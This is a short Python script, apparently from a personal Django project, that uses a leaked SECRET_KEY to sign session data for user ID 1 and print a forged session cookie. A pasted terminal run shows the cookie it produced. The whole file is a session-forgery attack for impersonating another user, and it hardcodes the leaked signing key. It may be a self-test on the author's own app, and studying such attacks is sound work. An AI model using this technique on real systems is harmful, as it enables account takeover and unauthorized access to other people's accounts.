import os
import sys
import json
import base64
from django.conf import settings
from django.core.signing import Signer

# Determine the project's root directory and add it to the Python path
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../'))
sys.path.append(project_root)

# Set up Django settings
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'crudproject.settings')
import django
django.setup()

# The SECRET_KEY from the leaked settings
SECRET_KEY = 'django-insecure-+bnw67qdf-&yhxri&@@u9zeye3w)u^)v(^s!*b+$$niwef1*&i'

# Sample session data
session_data = {
    '_auth_user_id': '1',  # ID of the user to impersonate
    '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend',
}

# Serialize and sign the session data
session_data_json = json.dumps(session_data)
session_data_encoded = base64.b64encode(session_data_json.encode()).decode()
signer = Signer(key=SECRET_KEY)
signed_session_data = signer.sign(session_data_encoded)

print(f'Session Cookie: {signed_session_data}')


'''
(.venv) @imvickykumar999 ➜ /workspaces/Django-CRUD-Form/impersonate/impersonate (main) $ python forge_session.py 
Session Cookie: eyJfYXV0aF91c2VyX2lkIjogIjEiLCAiX2F1dGhfdXNlcl9iYWNrZW5kIjogImRqYW5nby5jb250cmliLmF1dGguYmFja2VuZHMuTW9kZWxCYWNrZW5kIn0=:rRKKipbONKompC2CK0EudBKUlLnGpUZT2zn0wGyTrSU
'''
